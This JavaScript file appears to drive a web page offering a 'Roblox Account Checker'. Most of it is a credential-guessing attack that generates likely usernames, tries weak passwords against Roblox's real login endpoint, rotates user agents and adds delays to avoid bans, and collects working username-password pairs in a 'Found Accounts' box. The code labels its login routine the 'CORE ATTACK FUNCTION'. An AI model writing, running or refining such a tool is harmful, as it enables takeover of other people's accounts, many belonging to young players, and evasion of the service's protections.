document.addEventListener('DOMContentLoaded', () => {

    // --- TYPERIDER EFFECT ---
    const typeriderElement = document.getElementById('typerider');
    const text = 'im cracked fr';
    let index = 0;

    function typeWriter() {
        if (index < text.length) {
            typeriderElement.innerHTML += text.charAt(index);
            index++;
            setTimeout(typeWriter, 150);
        }
    }
    typeWriter();

    // --- MENU & CONTENT LOGIC ---
    const contentArea = document.getElementById('contentArea');
    const homeBtn = document.getElementById('homeBtn');
    const testBtn = document.getElementById('testBtn');

    homeBtn.addEventListener('click', () => {
        contentArea.innerHTML = '<h2>Home Screen</h2><p>The system is ready. Awaiting your command.</p>';
    });

    testBtn.addEventListener('click', () => {
        // Set up the content area with a loading message and the results box
        contentArea.innerHTML = `
            <h2>Roblox Account Checker (Advanced)</h2>
            <p>Initiating advanced bypass protocol. Rotating identities and vectors.</p>
            <div id="checkerOutput" style="opacity: 0; transition: opacity 1.5s ease-in;">Trying to load...</div>
            <div style="margin-top: 20px;">
                <label for="resultsBox" style="font-weight: bold;">Found Accounts:</label>
                <textarea id="resultsBox" rows="8" style="width: 100%; background-color: #111; color: #0f0; border: 1px solid #0f0; font-family: 'JetBrains Mono', monospace;" readonly placeholder="Valid accounts will appear here..."></textarea>
            </div>
        `;
        startAdvancedAccountChecker();
    });

    // --- ADVANCED ROBLOX ACCOUNT CHECKER ---
    async function startAdvancedAccountChecker() {
        const outputElement = document.getElementById('checkerOutput');
        const resultsBox = document.getElementById('resultsBox');

        // Trigger the smooth fade-in for the loading message
        setTimeout(() => {
            outputElement.style.opacity = 1;
        }, 100);

        // --- ADVANCED CONFIGURATION ---
        const robloxLoginUrl = 'https://auth.roblox.com/v2/login';
        const userAgents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:107.0) Gecko/20100101 Firefox/107.0'
        ];
        const baseWords = ['cool', 'epic', 'awesome', 'super', 'mega', 'ultra', 'shadow', 'dark', 'light', 'fire', 'ice', 'gamer', 'pro', 'legend', 'ninja'];
        const suffixes = ['2008', '2009', '2010', '2011', '2012', '123', '99', '01', 'x', 'xd', 'lol', 'rox'];

        function* generateUsernames() {
            for (const word of baseWords) {
                for (const suffix of suffixes) {
                    yield word + suffix;
                    yield word + '_' + suffix;
                }
            }
        }
        const usernameGenerator = generateUsernames();

        // --- CORE ATTACK FUNCTION ---
        async function attemptLogin(username, password, userAgent) {
            const headers = {
                'Content-Type': 'application/json',
                'User-Agent': userAgent,
                'Referer': 'https://www.roblox.com/login',
                'X-Requested-With': 'XMLHttpRequest'
            };
            const body = JSON.stringify({ username: username, password: password, captchaToken: null });
            try {
                const response = await fetch(robloxLoginUrl, { method: 'POST', headers: headers, body: body });
                const responseData = await response.json();
                if (response.ok && responseData.user) {
                    return { success: true, user: username, pass: password };
                } else {
                    if (responseData.errors && responseData.errors.find(e => e.code === 10)) {
                        return { success: false, reason: 'CAPTCHA', user: username };
                    }
                    return { success: false, reason: 'Invalid', user: username };
                }
            } catch (error) {
                return { success: false, reason: 'Network/Rate Limit', user: username };
            }
        }

        // --- MAIN LOOP ---
        const maxAttempts = 100; // How many username/password combos to try
        let foundCount = 0;

        for (let i = 0; i < maxAttempts; i++) {
            const username = usernameGenerator.next().value;
            if (!username) break;

            const passwordsToTry = [username, username + '123', username + '1', 'password', '123456'];
            const userAgent = userAgents[Math.floor(Math.random() * userAgents.length)];

            for (const password of passwordsToTry) {
                const outcome = await attemptLogin(username, password, userAgent);

                if (outcome.success) {
                    // JACKPOT!
                    foundCount++;
                    const successString = `USER: ${outcome.user} PASS: ${outcome.pass}`;
                    
                    // Update the main output log
                    outputElement.innerHTML += `<span style="color: #0f0;">SUCCESS! Found ${foundCount}.</span><br>`;
                    
                    // Add the found account to the results box
                    if (resultsBox.value) {
                        resultsBox.value += '\n'; // Add a newline if it's not empty
                    }
                    resultsBox.value += successString;

                } else {
                    // Update the status with the last failure reason
                    outputElement.innerHTML = `<span style="color: #f00;">FAILED [${outcome.user}]: ${outcome.reason}</span><br><span style="color: #fff;">Scanning... Found: ${foundCount}</span>`;
                }
            }

            // Auto-scroll the main output
            outputElement.scrollTop = outputElement.scrollHeight;

            // Add a delay to avoid getting banned
            await new Promise(resolve => setTimeout(resolve, 500));
        }

        outputElement.innerHTML += `<br><span style="color: #ff0;">Scan complete. Total found: ${foundCount}</span>`;
    }
});
